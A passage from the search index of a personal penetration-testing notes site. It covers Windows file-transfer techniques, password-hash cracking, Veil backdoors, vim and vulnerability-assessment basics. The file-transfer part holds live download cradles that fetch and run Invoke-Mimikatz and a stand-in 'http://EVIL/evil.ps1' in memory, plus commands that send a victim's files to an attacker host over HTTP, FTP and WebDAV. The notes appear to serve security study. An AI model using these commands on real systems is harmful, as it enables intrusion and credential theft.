Name&gt;')\nPS C:\\lala&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n# Net.WebClient: class name\n# DownloadFile: method\n\n\n# Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\lala&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')\n# Net.WebClient: class name\n# DownloadFileAsync: method\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-downloadstring-fileless-method_1","title":"PowerShell DownloadString - Fileless Method","text":"<p>PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias <code>IEX</code>.</p> <pre><code>PS C:\\lala&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n</code></pre> <p><code>IEX</code> also accepts pipeline input.</p> <pre><code>PS C:\\lala&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-invoke-webrequest","title":"PowerShell Invoke-WebRequest","text":"<p>From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available. This cmdlet gets content from a web page on the internet. We can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name.</p> <pre><code>Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n# alias: `iwr`, `curl`, and `wget`\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#bypassing-technique-parameter-usebasicparsing","title":"Bypassing technique: parameter -UseBasicParsing","text":"<p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.</p> <pre><code>Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#bypassing-technique-ssltls-secure-channel","title":"Bypassing technique: SSL/TLS secure channel","text":"<p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:</p> <pre><code># With this command we get the error Exception calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.\"\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\n##### To bypass it, first run\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#more-downloading-techniques","title":"More downloading techniques","text":"<p>From Harmj0y:</p> <pre><code># normal download cradle\nIEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")\n\n# PowerShell 3.0+\nIEX (iwr 'http://EVIL/evil.ps1')\n\n# hidden IE com object\n$ie=New-Object -comobject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('http://EVIL/evil.ps1'); start-sleep -s 5; $r=$ie.Document.body.innerHTML; $ie.quit();IEX $r\n\n# Msxml2.XMLHTTP COM object\n$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://EVIL/evil.ps1',$false); $h.send(); iex $h.responseText\n\n# WinHttp COM object (not proxy aware!)\n$h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','http://EVIL/evil.ps1',$false); $h.send();iex $h.responseText\n\n# using bitstransfer- touches disk!\nImport-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\\t; $r=gc $env:temp\\t; rm $env:temp\\t; iex $r\n\n# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)\n#   code to execute needs to be a base64 encoded string stored in a TXT record\nIEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt \"SERVER\" | Select -Pattern '\"*\"') -split '\"'[0]))))\n\n# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d\n&lt;#\n&lt;?xml version=\"1.0\"?&gt;\n&lt;command&gt;\n   &lt;a&gt;\n      &lt;execute&gt;Get-Process&lt;/execute&gt;\n   &lt;/a&gt;\n  &lt;/command&gt;\n#&gt;\n$a = New-Object System.Xml.XmlDocument\n$a.Load(\"https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt\")\n$a.command.a.execute | iex\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#smb","title":"SMB","text":"<p>The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.</p>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#simple-smbserver","title":"Simple SMBserver","text":"<p>From attacker machine, we can use smbserver.py:</p> <pre><code># First, we create an SMB server in our attacker machine (linux) with smbserver from Impacket \n\nsudo impacket-smbserver share -smb2support /tmp/smbshare\n</code></pre> <p>From the windows machine, the victim's, copy the File from the SMB Server</p> <pre><code>copy \\\\$ipServer\\share\\nc.exe\n</code></pre> <p>If blocked because of organization's security policies blocking unauthenticated guest access, create the SMBserver with username and password.</p>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#simple-smbserver-with-authentication","title":"Simple SMBServer with authentication","text":"<p>From attacker machine, we can use smbserver.py:</p> <pre><code>sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n</code></pre> <p>From victim's machine, the windows one:</p> <pre><code># mount the SMB Server with Username and Password\nnet use n: \\\\$ipServer\\share /user:test test\n\n# Copy the file\ncopy n:\\nc.exe\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#ftp-downloads","title":"FTP Downloads","text":"<p>Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.</p> <p>We can configure an FTP Server in our attack host using Python3 pyftpdlib module. It can be installed with the following command:</p>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#pyftpdlib-module","title":"pyftpdlib module","text":"<p>Configure an FTP Server in our attack host using Python3 pyftpdlib module:</p> <pre><code>sudo pip3 install pyftpdlib\n</code></pre> <p>Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.</p> <pre><code>sudo python3 -m pyftpdlib --port 21 --write\n</code></pre> <p>We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server. </p> <pre><code>(New-Object Net.WebClient).DownloadFile('ftp://$ipServer/file.txt', 'ftp-file.txt')\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#upload-from-windows","title":"Upload from Windows","text":"","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-base64-encode-decode_1","title":"PowerShell Base64 Encode &amp; Decode","text":"<p>Upload  from Windows (victim) to  linux (attacker) </p> <p>In the victim's machine (windows):</p> <pre><code># Encode File Using PowerShell\n[Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\n\nGet-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n</code></pre> <p>In the attacker's machine (Linux): We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.</p> <pre><code>echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d &gt; hosts\n\n\nmd5sum hosts \n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-systemnetwebclient_1","title":"Powershell  System.Net.WebClient","text":"","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-web-uploads","title":"PowerShell Web Uploads","text":"<p>First, we launch a webserver in out attacker machine. We can use uploadserver.</p> <pre><code># Install a Configured WebServer with Upload\npip3 install uploadserver\n\n# Run web server\npython3 -m uploadserver\n</code></pre> <p>From the victim's machine (windows), we will upload the file with Invoke-WebRequest:</p> <pre><code># PowerShell Script to Upload a File to Python Upload Server\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nInvoke-FileUpload -Uri http://$ipServer:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-base64-web-upload","title":"PowerShell Base64 Web Upload","text":"<p>Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat.</p> <pre><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\n\nInvoke-WebRequest -Uri http://$ipServer:8000/ -Method POST -Body $b64\n</code></pre> <p>From the attacker machine:</p> <pre><code># We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.\nnc -lvnp 8000\n\necho &lt;base64&gt; | base64 -d -w 0 &gt; hosts\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#smb-uploads","title":"SMB Uploads","text":"<p>When Microsoft is preventing SMB traffic, there is an alternative: running SMB over HTTP with\u00a0<code>WebDav</code>.\u00a0<code>WebDAV</code> (RFC 4918)\u00a0is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The\u00a0<code>WebDAV</code>\u00a0protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring.\u00a0<code>WebDAV</code>\u00a0can also use HTTPS.</p> <p>When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.</p>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#configuring-webdav-server","title":"Configuring WebDav Server","text":"<p>To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot.</p> <pre><code>pip install wsgidav cheroot\n</code></pre> <pre><code>sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#connect-to-the-server-and-the-share-from-windows","title":"Connect to the server and the share from windows","text":"<p>Now we can attempt to connect to the share using the <code>DavWWWRoot</code> directory.</p> <pre><code># DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. \nC:\\lala&gt; dir \\\\$ipServer\\DavWWWRoot\n\n# Upload files with SMB\ncopy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\$ipServer\\DavWWWRoot\\\n</code></pre> <p>If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.</p>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#ftp-uploads","title":"FTP Uploads","text":"","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#run-pyftpdlib-a-ftp-server","title":"Run pyftpdlib, a FTP server","text":"<p>We will use module pyftpdlib,  with the option <code>--write</code> to allow clients to upload files to our attack host.</p> <pre><code>sudo python3 -m pyftpdlib --port 21 --write\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#create-a-command-file-for-the-ftp-client-to-upload-a-file","title":"Create a Command File for the FTP Client to Upload a File","text":"<p>Example:</p> <pre><code>C:\\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt\nC:\\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo binary &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo PUT c:\\windows\\system32\\drivers\\etc\\hosts &gt;&gt; ftpcommand.txt\nC:\\htb&gt; echo bye &gt;&gt; ftpcommand.txt\nC:\\htb&gt; ftp -v -n -s:ftpcommand.txt\nftp&gt; open 192.168.49.128\n\nLog in with USER and PASS first.\n\n\nftp&gt; USER anonymous\nftp&gt; PUT c:\\windows\\system32\\drivers\\etc\\hosts\nftp&gt; bye\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"transferring-files-techniques-windows/#powershell-upload-file","title":"PowerShell Upload File","text":"<pre><code>(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n</code></pre>","tags":["windows","exploitation","file transfer technique","backdoors"]},{"location":"unshadow/","title":"unshadow","text":"<p>unshadow - combines passwd and shadow files</p>","tags":["bash"]},{"location":"unshadow/#brute-forcing-etcpasswd-and-etcshadow","title":"Brute forcing /etc/passwd and /etc/shadow","text":"<p>First, save /etc/passwd and john /etc/shadow from the victim machine to the attacker machine.</p> <p>Second, use unshadow to put users and passwords in the same file:</p> <pre><code>unshadow passwd shadow &gt; crackme\n# passwd: file saved with /etc/passwd content.\n# shadow: file saved with /etc/shadow content.\n</code></pre> <p>Third, run johtheripper or hashcat to crack the hash.</p>","tags":["bash"]},{"location":"uploadserver/","title":"uploadserver","text":"<p>Python's http.server extended to include a file upload page. Accepts the same options as http.server, plus a couple extras.</p> <p>After the server starts, the upload page is at /upload. For example, if the server is running at http://localhost:8000/ go to http://localhost:8000/upload .</p> <p>Warning: This is an upload server, and running it will allow uploads.</p>","tags":["file transfer technique","server"]},{"location":"uploadserver/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/Densaugeo/uploadserver.</p> <pre><code>python3 -m pip install --user uploadserver\n</code></pre>","tags":["file transfer technique","server"]},{"location":"uploadserver/#basic-usage","title":"Basic usage","text":"<pre><code>python3 -m uploadserver\n</code></pre> <p>Accepts the same options as http.server. After the server starts, the upload page is at /upload. For example, if the server is running at http://localhost:8000/ go to http://localhost:8000/upload .</p> <p>Now supports uploading multiple files at once! Select multiple files in the web page's file selector, or upload with cURL:</p> <pre><code>curl -X POST http://127.0.0.1:8000/upload -F 'files=@multiple-example-1.txt' -F 'files=@multiple-example-2.txt'\n</code></pre> <p>See an example in File Transfer techniques for Linux.</p>","tags":["file transfer technique","server"]},{"location":"username-anarchy/","title":"Username Anarchy","text":"<p>Ruby-based tool for generating usernames.</p> <p>This is useful for user account/password brute force guessing and username enumeration when usernames are based on the users' names. By attempting a few weak passwords across a large set of user accounts, user account lockout thresholds can be avoided.</p>"},{"location":"username-anarchy/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/urbanadventurer/username-anarchy.</p> <pre><code>git clone https://github.com/urbanadventurer/username-anarchy.git\n</code></pre>"},{"location":"username-anarchy/#basic-usage","title":"Basic usage","text":"<pre><code>cd username-anarchy\n./username-anarchy -i /home/ltnbob/realneames.txt \n</code></pre>"},{"location":"veil/","title":"veil","text":"","tags":["pentesting","web pentesting"]},{"location":"veil/#installation","title":"Installation","text":"<p>Repository: https://github.com/Veil-Framework/Veil/</p> <p>Quick install for kali:</p> <pre><code>apt update\napt install -y veil\n/usr/share/veil/config/setup.sh --force --silent\n</code></pre> <p>To run veil:</p> <pre><code>veil\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"veil/#usage-and-basic-command","title":"Usage and basic command","text":"<p>Tool \"Evasion\" creates undetectable backdoors.</p> <p>\"Ordenance\" is the payload part that we will launch to this backdoor.</p> <p>Reading list:</p> <ul> <li>https://www.zonasystem.com/2020/07/shellter-veil-evasion-evasion-de-antivirus-ocultando-shellcodes-de-binarios.html</li> <li>https://www.hackingloops.com/veil-evasion-virustotal/---</li> </ul> <p>One nice thing about veil is that it provides a metasploit RC file, meaning that in order to launch the multihandler you just need to run:</p> <pre><code>msfconsole -r path/to/metasploitRCfile\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"vim/","title":"Vim - A text editor","text":""},{"location":"vim/#open-a-file","title":"Open a file","text":"<p>To edit a new file. </p> <pre><code>nvim &lt;file&gt;\n</code></pre> <p>Open a file in a recovery mode:</p> <pre><code>nvim -r &lt;file&gt;\n</code></pre>"},{"location":"vim/#go-to-insert-mode","title":"Go to INSERT mode","text":"<p>To enter into edit mode, press Supr twice and start writting</p> <ul> <li>a : Cursor after the character.</li> <li>i : Cursor before the character.</li> <li>A : Cursor at the end of the line.</li> <li>I : Cursor at the beginning of the line.</li> </ul> <p>To get out of INSERT mode, press ESC.</p>"},{"location":"vim/#browsing-the-file-in-cursor-mode","title":"Browsing the file in CURSOR mode","text":"<ul> <li>2:  Go to line 2 of the file.</li> <li>gg: Go to line 1 of the file.</li> <li>G : Go to last line.</li> <li>G : Go to line n.  <li>0 : Go to the beginning of line.</li> <li>$ : Go to the end of line.</li>"},{"location":"vim/#delete-cut-in-cursor-mode","title":"Delete (cut) in CURSOR mode","text":"<p>There is no delete in CURSOR mode. What it does is to CUT the content. There is also no need to enter into the INSERT mode to remove some text. You can delete text in the CURSOR mode with these keys:</p> <ul> <li>x : Cut character.</li> <li>dd : Cut full line.</li> <li>dw : Cut word.</li> <li>d$ : Cut from the cursor position to the end of line.</li> <li>dw : Cut n words from cursor position. For instance, \"d3w\" cuts three words.  <li>dd : Cut n lines from cursor position. For instance, \"d4d\" cuts four lines. <li>ciw : Cut word no matter cursor position. Also no matter it word was in parathesis or \"\".</li> <li>yw: Copy word.</li> <li>yy: Copy full line.</li> <p>Tip: We can multiply any command to run multiple times by adding a number before it. For example, '4yw' would copy 4 words instead of one, and so on.</p>"},{"location":"vim/#select-text","title":"Select text","text":"<p>To select a content in CURSOR mode you need to change to VISUAL mode. </p> <ul> <li>v : Changes from CURSOR mode to VISUAL mode.</li> <li>V : Changes from CURSOR mode to VISUAL mode AND select the line where the cursor was.</li> </ul> <p>Being in VISUAL mode you can:</p> <ul> <li>Select lines with cursor position (Up and Down arrows).</li> <li>w : Select a word.</li> </ul>"},{"location":"vim/#replace-in-cursor-mode","title":"Replace in CURSOR mode","text":"<ul> <li>R : Insert the text you want and it replaces the existing one.</li> </ul>"},{"location":"vim/#copy-in-cursor-mode","title":"Copy in CURSOR mode","text":"<p>To copy into the clip:</p> <ul> <li>y : Copy selected content into the clip. </li> </ul>"},{"location":"vim/#paste-in-cursor-mode","title":"Paste in CURSOR mode","text":"<p>Everything you delete goes to the clip. To paste in CURSOR mode, press key:</p> <ul> <li>p : Paste clip in the next line.</li> <li>P : Paste clip in previous line.</li> </ul>"},{"location":"vim/#insert-a-line-in-cursor-mode","title":"Insert a line in CURSOR mode","text":"<p>Press these keys:</p> <ul> <li>o : Add a line under cursor position.</li> <li>O : Add a line before cursor position.</li> </ul>"},{"location":"vim/#undo-and-redo-changes-in-cursor-mode","title":"Undo and Redo changes in CURSOR mode","text":"<p>You can do and undo changes from CURSOR mode with these keys:</p> <ul> <li>u : Undo changes.</li> <li>r : Redo changes.</li> </ul>"},{"location":"vim/#close-a-file","title":"Close a file","text":"<p>There were no modifications. Close it without save it:</p> <pre><code># Press Esc key to enter CURSOR mode.\n:q\n# Hit ENTER\n</code></pre> <p>There were modifications but you don't want to save it:</p> <pre><code># Press Esc key to enter CURSOR mode.\n:q!\n# Hit ENTER\n</code></pre>"},{"location":"vim/#save-a-file","title":"Save a file","text":"<p>To save the file and continue editing:</p> <pre><code># Press Esc key to enter CURSOR mode.\n:w\n# Hit ENTER\n</code></pre> <p>To save the file and quit the editor:</p> <pre><code># Press Esc key to enter CURSOR mode.\n:wq!\n# Hit ENTER\n</code></pre> <p>Also, you can:</p> <pre><code># Press Esc key to enter CURSOR mode.\n:x\n# Hit ENTER\n</code></pre> <p>To save the file with a different name:</p> <pre><code># Press ESC key to enter CURSOR mode.\n:w &lt;newFileName&gt;\n# Hit ENTER\n</code></pre>"},{"location":"vim/#browsing-activities-in-the-editor","title":"Browsing activities in the editor","text":"<p>Keys g+d: highlight the definition of a variable/function/... in the file. Keys g+f: takes you to the definition of that variable/function/... in the file, even if it's a different file from the one we have open. Our browsing activity will pile up in the VIM editor.</p> <p>To switch between activities:</p> <ul> <li>CTRL+o : Go back into the browsing activity.</li> <li>CTRL+i : Go forward.</li> </ul>"},{"location":"vim/#search-in-cursor-mode","title":"Search in CURSOR mode","text":"<p>Search from cursor position with:</p> <ul> <li>\\expression : Search word expression.</li> <li>n : Go to the next occurrence.</li> <li>N : Go to previous occurrence.</li> <li>ESC : Escape the search.</li> </ul>"},{"location":"vim/#browsing-from-opening-and-closing-tags","title":"Browsing from opening and closing tags","text":"<p>Move the cursor position from a closing parenthesis to the opening one:</p> <ul> <li>% : Change position between opening or closing tags () [] \" \"</li> </ul>"},{"location":"vim/#substitute-in-cursor-mode","title":"Substitute in CURSOR mode","text":"<p>To change \"expresion1\" to \"expresion2\" for the first occurrence:</p> <pre><code># Press ESC key to enter CURSOR mode.\n:s/expression1/expression2\n</code></pre> <p>To change all occurrences of the line:</p> <pre><code># Press ESC key to enter CURSOR mode.\n:s/expression1/expression2/g\n</code></pre> <p>To change all occurrences in the document (not asking one by one):</p> <pre><code># Press ESC key to enter CURSOR mode.\n:s%/expression1/expression2/g\n</code></pre> <p>To change all occurrences in the document asking one by one:</p> <pre><code># Press ESC key to enter CURSOR mode.\n:s%/expression1/expression2/gc\n</code></pre>"},{"location":"virtualbox/","title":"VirtualBox and Extension Pack","text":"<p>How to install the Extension Pack manually, bypassing possible policies existing in a Windows DC.</p> <ol> <li>The .vbox-extpack file that can be downloaded. Actually, it is just a .tar.gz archive so its contents can be unpacked. </li> <li>Place these contents in subdirectory ExtensionPacks of the VirtualBox installation directory, tipically C:\\Program Files\\Oracle\\VirtualBox</li> <li>That's it. Run Virtualbox and click on Install extension in the corresponding section. Installation now will be successful. </li> </ol>","tags":["windows","bypass techniques"]},{"location":"virtualbox/#how-to-enlarge-a-virtual-machines-disk-in-virtualbox","title":"How to Enlarge a Virtual Machine\u2019s Disk in VirtualBox","text":"<p>In VirtualBox, go to File &gt; Virtual Media Manager and use the slider to adjust the disk size. In VMWare, right-click your virtual machine (VM), then go to Settings &gt; Hard Disk &gt; Expand, and expand the disk. Finally, boot your VM and expand the partition using GParted on Linux or Disk Management on Windows.</p>","tags":["windows","bypass techniques"]},{"location":"vnstat/","title":"vnstat - Monitoring network impact","text":"","tags":["network","bash","tools"]},{"location":"vnstat/#installation","title":"Installation","text":"<pre><code>sudo apt install vnstat    \n</code></pre>","tags":["network","bash","tools"]},{"location":"vnstat/#basic-usage","title":"Basic usage","text":"<p>Monitor the <code>eth0</code> network adapter before running a Nessus scan:</p> <pre><code>sudo vnstat -l -i eth0\n</code></pre>","tags":["network","bash","tools"]},{"location":"vpn/","title":"VPN notes","text":"<p>There are two main types of remote access VPNs: client-based VPN and SSL VPN. SSL VPN uses the web browser as the VPN client.</p> <p>Usage of a VPN service does not guarantee anonymity or privacy but is useful for bypassing certain network/firewall restrictions or when connected to a possible hostile network.</p> <p>When connected to any penetration testing/hacking-focused lab, we should always consider the network to be \"hostile.\" We should only connect from a virtual machine, disallow password authentication if SSH is enabled on our attacking VM, lockdown any web servers, and not leave sensitive information on our attack VM.  </p> <p>DO NOT use the same VM that we use to perform client assessments to play CTF in any platform  .</p> <pre><code># Show us the networks accessible via the VPN.\n netstat -rn\n</code></pre>","tags":["vpn"]},{"location":"vulnerability-assessment/","title":"Vulnerability assessment","text":"","tags":["pentesting","assessment","openvas","nessus"]},{"location":"vulnerability-assessment/#vulnerability-assessment-versus-pentesting","title":"Vulnerability assessment versus pentesting","text":"<p><code>Vulnerability Assessments</code>\u00a0and Penetration Tests are two completely different assessments. Vulnerability assessments look for vulnerabilities in networks without simulating cyber attacks.</p> <p><code>Penetration tests</code>, depending on their type, evaluate the security of different assets and the impact of the issues present in the environment. Penetration tests can include manual and automated tactics to assess an organization's security posture. </p> <p></p>","tags":["pentesting","assessment","openvas","nessus"]},{"location":"vulnerability-assessment/#other-types-of-security-assessments","title":"Other Types of Security Assessments","text":"<ul> <li><code>Security audits</code>\u00a0are typically requirements from outside the organization, and they're typically mandated by\u00a0<code>government agencies</code>\u00a0or\u00a0<code>industry associations</code>\u00a0to assure that an organization is compliant with specific security regulations.</li> <li><code>Bug bounty programs</code>\u00a0are implemented by all kinds of organizations. They invite members of the general public, with some restrictions (usually no automated scanning), to find security vulnerabilities in their applications.</li> <li>Companies with larger budgets and more resources can hire their own dedicated\u00a0<code>red teams</code>\u00a0or use the services of third-party consulting firms to perform red team assessments. A red team consists of offensive security professionals who have considerable experience with penetration testing. A red team plays a vital role in an organization's security posture.</li> <li><code>Purple teams</code>\u00a0are formed when\u00a0<code>offensive</code>\u00a0and\u00a0<code>defensive</code>\u00a0security specialists work together with a common goal, to improve the security of their network. Red teams find security problems, and blue teams learn about those problems from their red teams and work to fix them.</li> </ul>","tags":["pentesting","assessment","openvas","nessus"]},{"location":"vulnerability-assessment/#methodology","title":"Methodology","text":"","tags":["pentesting","assessment","openvas","nessus"]},{"location":"vulnerability-assessment/#compliance-standards","title":"Compliance standards","text":"<p>The big compliance players in information security are\u00a0<code>PCI</code>,\u00a0<code>HIPAA</code>,\u00a0<code>FISMA</code>, and\u00a0<code>ISO 27001</code>:</p> <ul> <li>Payment Card Industry Data Security Standard (PCI DSS).</li> <li>Health Insurance Portability and Accountability Act (HIPAA)</li> <li>Federal Information Security Management Act (FISMA)</li> <li>ISO 27001 is a standard used worldwide to manage information security. The International Organization for Standardization (ISO).</li> </ul> <p>OWASP maintains a few different standards and helpful guides for assessment various technologies:</p> <ul> <li>Web Security Testing Guide (WSTG)</li> <li>Mobile Security Testing Guide (MSTG)</li> <li>Firmware Security Testing Methodology</li> </ul>","tags":["pentesting","assessment","openvas","nessus"]},{"location":"vulnerability-assessment/#how-to-asset-a-risk","title":"How to asset a risk","text":"<p>One tool is the Common Vulnerability Scoring System. </p> <p>Additionally. we have Common Vulnerabilities and Exposures (CVE), a publicly available catalog of security issues sponsored by the United States Department of Homeland Security (DHS). Each security issue has a unique CVE ID number assigned by the CVE Numbering Authority (CNA).</p> <p>Tools:  nessus, openvas </p>","tags":["pentesting","assessment","openvas","nessus"]},{"location":"vulnhub-goldeneye-1/","title":"Walkthrough - GoldenEye 1, a vulnhub machine","text":"","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#about-the-machine","title":"About the machine","text":"data Machine GoldenEye 1 Platform Vulnhub url link Download https://drive.google.com/open?id=1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq Download Mirror https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova Size 805 MB Author creosote Release date 4 May 2018 Description OSCP type vulnerable machine that's themed after the great James Bond film (and even better n64 game) GoldenEye. The goal is to get root and capture the secret GoldenEye codes - flag.txt. Difficulty Easy","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#walkthrough","title":"Walkthrough","text":"","tags":["walkthrough"]},{"location":"vulnhub-goldeneye-1/#setting-up-the-machines","title":"Setting up the 